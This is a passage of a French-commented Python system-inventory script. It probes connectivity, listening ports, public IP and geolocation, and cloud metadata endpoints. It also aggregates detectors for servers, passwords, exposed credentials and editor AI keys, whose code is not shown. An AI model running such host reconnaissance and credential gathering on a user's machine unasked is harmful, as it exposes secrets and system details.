            req = urllib.request.Request(url, headers={"User-Agent": "detectOS/1.0"})
            with urllib.request.urlopen(req, timeout=2.0) as resp:
                http_checks[url] = {"ok": 200 <= resp.status < 400, "status": resp.status,
                                   "latency_ms": int((time.time() - start) * 1000)}
        except Exception as e:
            http_checks[url] = {"ok": False, "error": str(e)}
    result["http"] = http_checks
    
    # Ping latency
    latencies = {}
    if SYS in ("Linux", "Darwin"):
        for host in ["1.1.1.1", "8.8.8.8"]:
            r = run_cmd(f"ping -c 1 -W 1 {host}")
            if r.get("ok"):
                m = re.search(r"time[=<]\s*([0-9\.]+)\s*ms", r["stdout"])
                latencies[host] = {"ok": True, "rtt_ms": float(m.group(1)) if m else None}
            else:
                latencies[host] = {"ok": False}
    if latencies: result["ping"] = latencies
    
    result["online"] = any(v.get("ok") for v in http_checks.values()) or any(result["tcp"].values())
    return result

# ======================== SERVICES ========================
@safe(dict)
def detect_services() -> Dict[str, Any]:
    """Ports en écoute (TCP/UDP)."""
    listening = []
    seen = set()
    
    if psutil:
        try:
            for c in psutil.net_connections(kind="tcp"):
                if getattr(c, "status", "") != "LISTEN": continue
                laddr = getattr(c, "laddr", None)
                if not laddr: continue
                ip, port = getattr(laddr, "ip", None), getattr(laddr, "port", None)
                key = ("tcp", ip, port)
                if key in seen: continue
                seen.add(key)
                proc_name = None
                if getattr(c, "pid", None) and psutil.pid_exists(c.pid):
                    try: proc_name = psutil.Process(c.pid).name()
                    except: pass
                listening.append({"proto": "tcp", "ip": ip, "port": port, "pid": c.pid, "process": proc_name})
        except: pass
    else:
        if shutil.which("lsof"):
            r = run_cmd("lsof -nP -iTCP -sTCP:LISTEN", timeout=4.0)
            if r.get("ok"):
                for line in r["stdout"].splitlines()[1:]:
                    parts = re.split(r"\s+", line.strip())
                    if len(parts) >= 9:
                        m = re.search(r".*:(\d+)(?:->|$)", parts[-1])
                        if m: listening.append({"proto": "tcp", "port": int(m.group(1)), "process": parts[0]})
    
    return {"listening": listening}

# ======================== SPEEDTEST ========================
@safe(dict)
def detect_speedtest() -> Dict[str, Any]:
    """Test de vitesse: DNS, IPs, download/upload Mb/s."""
    out = {}
    
    # DNS server
    dns_server = None
    try:
        if os.path.exists("/etc/resolv.conf"):
            with open("/etc/resolv.conf", "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    if line.strip().startswith("nameserver"):
                        parts = line.split()
                        if len(parts) >= 2: dns_server = parts[1]; break
    except: pass
    out["dns_server"] = dns_server
    
    # Private IPs
    priv_v4, priv_v6 = [], []
    if psutil:
        try:
            for name, addr_list in psutil.net_if_addrs().items():
                for a in addr_list:
                    if a.family == socket.AF_INET and a.address != "127.0.0.1":
                        priv_v4.append(a.address)
                    elif a.family == socket.AF_INET6:
                        addr = a.address.split('%')[0]
                        if addr != "::1" and not addr.lower().startswith("fe80:"):
                            priv_v6.append(addr)
        except: pass
    out["private_ipv4"] = sorted(set(priv_v4)) or None
    out["private_ipv6"] = sorted(set(priv_v6)) or None

    # Public IPs
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=2.0) as r:
            v = r.read(64).decode("utf-8", "ignore").strip()
            if v and ":" not in v: out["public_ipv4"] = v
    except: pass
    try:
        with urllib.request.urlopen("https://api6.ipify.org", timeout=2.0) as r:
            v = r.read(64).decode("utf-8", "ignore").strip()
            if v and ":" in v: out["public_ipv6"] = v
    except: pass
    
    # Speedtest (if available)
    download_mbps = upload_mbps = ping_ms = None
    if shutil.which("speedtest"):
        st = run_cmd("speedtest --secure --timeout 10 --json", timeout=60)
        if st.get("ok") and st.get("stdout", "").startswith("{"):
            try:
                data = json.loads(st["stdout"])
                if data.get("download"): download_mbps = round(float(data["download"]) / 1_000_000.0, 2)
                if data.get("upload"): upload_mbps = round(float(data["upload"]) / 1_000_000.0, 2)
                if isinstance(data.get("ping"), (int, float)): ping_ms = float(data["ping"])
            except: pass
    
    out["download_mbps"] = download_mbps
    out["upload_mbps"] = upload_mbps
    out["ping_ms"] = ping_ms
    
    return out

# ======================== GEOLOCALISATION ========================
@safe(dict)
def detect_geo() -> Dict[str, Any]:
    """Géolocalisation via cloud metadata et APIs publiques."""
    info = {}
    
    # Cloud provider
    provider = None
    if os.environ.get("COLAB_RELEASE_TAG"): provider = "gcp"
    if not provider:
        if http_get("http://169.254.169.254/latest/meta-data/ami-id"): provider = "aws"
        elif http_get("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"}): provider = "azure"
        elif http_get("http://169.254.169.254/computeMetadata/v1/instance/id", {"Metadata-Flavor": "Google"}): provider = "gcp"
    
    # Cloud region
    if provider == "aws":
        region = http_get("http://169.254.169.254/latest/meta-data/placement/region")
        if region: info["region"] = region.strip()
    elif provider == "azure":
        data = http_get("http://169.254.169.254/metadata/instance/compute/location?api-version=2021-02-01", {"Metadata": "true"})
        if data: info["region"] = data.strip().strip('"')
    elif provider == "gcp":
        zone = http_get("http://169.254.169.254/computeMetadata/v1/instance/zone", {"Metadata-Flavor": "Google"})
        if zone and "/" in zone:
            zr = zone.split("/")[-1]
            if "-" in zr: info["region"] = "-".join(zr.split("-")[:2])
    
    if provider: info["cloud_provider"] = provider
    
    # Public geo API
    for url in ["https://ipinfo.io/json", "https://ipapi.co/json/"]:
        s = http_get(url, timeout=1.2)
        if s and s.strip().startswith("{"):
            try:
                j = json.loads(s)
                info["public_geo"] = {
                    "ip": j.get("ip"), "country": j.get("country") or j.get("country_code"),
                    "region": j.get("region") or j.get("state"), "city": j.get("city"),
                    "org": j.get("org"), "source": url
                }
                if not info.get("country"): info["country"] = info["public_geo"].get("country")
                break
            except: pass
    
    return info

# ======================== SYNTHESE ========================
def summarize() -> Dict[str, Any]:
    """Agrège toutes les détections en JSON final."""
    data = {
        "os": detect_os(),
        "environment": detect_runtime_env(),
        "ui": detect_ui_env(),
        "user": detect_user_session(),
        "colab": detect_colab_hardware(),
        "execution": detect_execution_type(),
        "browsers": detect_browsers(),
        "user_agents": detect_user_agents(),
        "mcps": detect_mcps(),
        "paths": detect_paths(),
        "hardware": detect_hardware(),
        "cpu": detect_cpu(),
        "cpu_advanced": detect_cpu_advanced(),
        "gpus_tpus": detect_gpus_tpus(),
        "accelerators": detect_accelerators(),
        "memory": detect_memory(),
        "storage": detect_storage(),
        "storage_performance": detect_storage_performance(),
        "peripherals": detect_peripherals(),
        "network": detect_network(),
        "open_ports": detect_open_ports(),
        "remote_access": detect_remote_access(),
        "servers_and_passwords": detect_servers_and_passwords(),
        "security_audit": detect_exposed_credentials(),
        "ai_llm_metrics": detect_ai_llm_metrics(),
        "editor_ai_keys": detect_editor_ai_keys(),
        "services": detect_services(),
        "dns": detect_dns(),
        "speedtest": detect_speedtest(),
        "internet": detect_internet(),
        "geo": detect_geo(),
        "health": detect_health(),
        "usage": detect_usage(),
        "user_permissions": detect_user_permissions(),
        "system_limits": detect_system_limits(),
        "sandbox": detect_sandbox(),
        "hypervisor": detect_hypervisor(),
        "containers": detect_containers(),
        "datetime": detect_datetime(),
        "languages_tools": detect_lang_envs(),
        "installed_software": detect_installed_software(),
        "ml_capabilities": detect_ml_capabilities(),
        "ollama": detect_ollama(),
        "llamacpp": detect_llamacpp(),
        "pytorch": detect_pytorch(),
        "python": {
            "version": sys.version.split("\n")[0],
            "executable": sys.executable,
            "venv": os.environ.get("VIRTUAL_ENV") or os.environ.get("CONDA_PREFIX")
        }
    }
    
    # Summary sizes + métriques IA/ML
    try:
        ram_total = data.get("memory", {}).get("ram", {}).get("total")
        ram_avail = data.get("memory", {}).get("ram", {}).get("available")
        root_disk = data.get("storage", {}).get("root", {})
        ml_caps = data.get("ml_capabilities", {})
        accel = data.get("accelerators", {})

        summary = {
            "ram_total_gib": _to_gib(ram_total),
            "ram_available_gib": _to_gib(ram_avail),
            "disk_root_total_gib": root_disk.get("total_gib"),
            "disk_root_free_gib": root_disk.get("free_gib")
        }

        # Métriques IA/ML importantes
        if ml_caps.get("ml_ready"):
            summary["ml_ready"] = True
            summary["torch_available"] = bool(ml_caps.get("torch"))
            summary["tensorflow_available"] = bool(ml_caps.get("tensorflow"))

        # GPU/TPU pour IA
        if accel.get("nvidia_compute_caps"):
            summary["gpu_compute_capabilities"] = accel["nvidia_compute_caps"]
        if accel.get("tpu_available"):
            summary["tpu_available"] = True

        # Stockage pour datasets
        storage_perf = data.get("storage_performance", {})
        if storage_perf.get("available_for_datasets_gb"):
            summary["available_for_datasets_gb"] = storage_perf["available_for_datasets_gb"]

            # Comptes logiciels installés
        installed = data.get("installed_software", {})
        summary["installed_counts"] = {
            "pip": installed.get("pip_packages_count"),
            "conda": installed.get("conda_packages_count"),
            "brew_formulas": installed.get("brew_formulas_count"),
            "brew_casks": installed.get("brew_casks_count"),
            "apt": installed.get("apt_packages_count") or installed.get("dpkg_packages_count"),
            "rpm": installed.get("rpm_packages_count"),
            "snap": installed.get("snap_packages_count"),
            "flatpak": installed.get("flatpak_apps_count"),
            "npm_global": installed.get("npm_global_count"),
            "cargo": installed.get("cargo_packages_count"),
            "go": installed.get("go_packages_count"),
            "macos_apps": installed.get("macos_apps_count"),
            "windows_programs": installed.get("windows_programs_count"),
        }

        data["summary_sizes"] = summary
    except: pass
    
    return data


def format_readable_output(data: Dict[str, Any]) -> str:
    """Formate la sortie JSON avec des séparations visuelles par section."""
    sections = []

    # Ordre des sections logiques
    section_order = [
        ("os", "═══════════════════ SYSTÈME D'EXPLOITATION ═══════════════════"),
        ("environment", "═══════════════════ ENVIRONNEMENT ═══════════════════"),
        ("cpu", "═══════════════════ PROCESSEUR ═══════════════════"),
        ("memory", "═══════════════════ MÉMOIRE ═══════════════════"),
        ("storage", "═══════════════════ STOCKAGE ═══════════════════"),
        ("network", "═══════════════════ RÉSEAU ═══════════════════"),
        ("dns", "═══════════════════ DNS ═══════════════════"),
        ("open_ports", "═══════════════════ PORTS OUVERTS ═══════════════════"),
        ("remote_access", "═══════════════════ ACCÈS DISTANT ═══════════════════"),
        ("servers_and_passwords", "═══════════════════ SERVEURS & CREDENTIALS ═══════════════════"),
        ("security_audit", "═══════════════════ AUDIT DE SÉCURITÉ ═══════════════════"),
        ("ai_llm_metrics", "═══════════════════ MÉTRIQUES AI/LLM ═══════════════════"),
        ("accelerators", "═══════════════════ ACCÉLÉRATEURS (GPU/TPU) ═══════════════════"),
        ("ml_capabilities", "═══════════════════ CAPACITÉS ML ═══════════════════"),
        ("pytorch", "═══════════════════ PYTORCH ═══════════════════"),
        ("ollama", "═══════════════════ OLLAMA ═══════════════════"),
        ("llamacpp", "═══════════════════ LLAMA.CPP ═══════════════════"),
        ("languages_tools", "═══════════════════ LANGAGES & OUTILS ═══════════════════"),
        ("installed_software", "═══════════════════ LOGICIELS INSTALLÉS ═══════════════════"),
        ("containers", "═══════════════════ CONTAINERS ═══════════════════"),
        ("services", "═══════════════════ SERVICES ═══════════════════"),
        ("user_permissions", "═══════════════════ PERMISSIONS UTILISATEUR ═══════════════════"),
        ("summary_sizes", "═══════════════════ RÉSUMÉ ═══════════════════"),
    ]

    output_lines = []
    output_lines.append("\n╔═══════════════════════════════════════════════════════════════════╗")
    output_lines.append("║          DETECTCONFIG - ANALYSE SYSTÈME COMPLÈTE                  ║")
    output_lines.append("╚═══════════════════════════════════════════════════════════════════╝\n")

    for key, header in section_order:
        if key in data and data[key]:
            output_lines.append(f"\n{header}")
            output_lines.append(json.dumps({key: data[key]}, indent=2, ensure_ascii=False))
            output_lines.append("")

    # Ajouter les sections restantes non listées
    for key in data:
        if not any(k == key for k, _ in section_order):
            output_lines.append(f"\n═══════════════════ {key.upper().replace('_', ' ')} ═══════════════════")
            output_lines.append(json.dumps({key: data[key]}, indent=2, ensure_ascii=False))
            output_lines.append("")

    return "\n".join(output_lines)


def build_human_view(data: Dict[str, Any]) -> Dict[str, Any]:
    """Réorganise les sections en vue synthétique"""
    o = OrderedDict()

    # 1) Système & contexte
    o["system"] = {
        "os": data.get("os"),
        "environment": data.get("environment"),
        "ui": data.get("ui"),
        "user": data.get("user"),
        "execution": data.get("execution"),
        "paths": data.get("paths"),
        "datetime": data.get("datetime"),
        "summary_sizes": data.get("summary_sizes"),
    }

    # 2) Matériel & ressources locales
    o["hardware"] = {
        "hardware_overview": data.get("hardware"),
        "cpu": data.get("cpu"),
        "cpu_advanced": data.get("cpu_advanced"),
        "memory": data.get("memory"),
        "storage": data.get("storage"),
        "storage_performance": data.get("storage_performance"),
        "peripherals": data.get("peripherals"),
    }

    # 3) Santé & limites système
    o["health_limits"] = {
        "health": data.get("health"),
        "usage": data.get("usage"),
        "user_permissions": data.get("user_permissions"),
        "system_limits": data.get("system_limits"),
        "sandbox": data.get("sandbox"),
        "hypervisor": data.get("hypervisor"),
        "containers": data.get("containers"),
    }

    # 4) Services / chemins divers
    o["services_misc"] = {
        "services": data.get("services"),
        "paths_extra": data.get("paths"),
    }

    # Avant-dernier : Réseau
    o["networking"] = {
        "network": data.get("network"),
        "internet": data.get("internet"),
        "speedtest": data.get("speedtest"),
        "geo": data.get("geo"),
    }

    # Dernier : Logiciels, IA/ML, MCP, paquets, Ollama
    o["software_ai"] = {
        "languages_tools": data.get("languages_tools"),
        "installed_software": data.get("installed_software"),
        "mcps": data.get("mcps"),
        "ml_capabilities": data.get("ml_capabilities"),
        "accelerators": data.get("accelerators"),
        "gpus_tpus": data.get("gpus_tpus"),
        "pytorch": data.get("pytorch"),
        "ollama": data.get("ollama"),
        "llamacpp": data.get("llamacpp"),
    }

    return o

# ======================== MAIN ========================
def main(argv: Optional[List[str]] = None) -> None:
    """Point d'entrée CLI."""
    parser = argparse.ArgumentParser(description="Detect system configuration")
    parser.add_argument("--json", action="store_true", help="Compact JSON output")
    parser.add_argument("--install-optional", action="store_true", help="Install psutil if missing")
    parser.add_argument("--human", action="store_true", help="JSON lisible (sections réordonnées)")
    parser.add_argument("--readable", action="store_true", help="Sortie avec séparations visuelles par section")
    parser.add_argument("--output", type=str, help="Enregistrer le résultat JSON dans un fichier")
    # Utiliser parse_known_args pour ignorer les arguments non reconnus (ex: -f depuis Jupyter)
    args, unknown = parser.parse_known_args(argv)

    global psutil
    psutil = _ensure_psutil(allow_install=args.install_optional)

    info = summarize()

    if args.readable:
        # Sortie formatée avec séparations
        print(format_readable_output(info))
    elif args.human:
        # Vue réorganisée
        info = build_human_view(info)
        print(json.dumps(info, indent=None if args.json else 2, ensure_ascii=False))
    else:
        # Sortie JSON standard
        json_output = json.dumps(info, indent=None if args.json else 2, ensure_ascii=False)
        if args.output:
            try:
                with open(args.output, 'w', encoding='utf-8') as f:
                    f.write(json_output)
                print(f"Rapport enregistré dans : {args.output}")
            except Exception as e:
                print(f"Erreur lors de l'enregistrement : {e}")
        else:
            print(json_output)

if __name__ == "__main__":
    main()
